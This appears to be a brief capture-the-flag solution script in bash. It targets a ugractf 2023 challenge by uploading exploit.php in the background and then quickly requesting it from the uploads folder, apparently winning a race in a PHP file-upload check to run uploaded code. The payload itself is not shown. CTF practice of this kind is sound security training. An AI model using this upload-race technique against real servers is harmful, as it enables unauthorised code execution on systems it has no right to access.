#!/usr/bin/env bash
set -e

URL="https://collateral.q.2023.ugractf.ru/16p5vje5vqr750kt"

curl -s "$URL" -F "malware=@exploit.php" >/dev/null & sleep 0.5
curl -s "$URL/uploads/exploit.php"
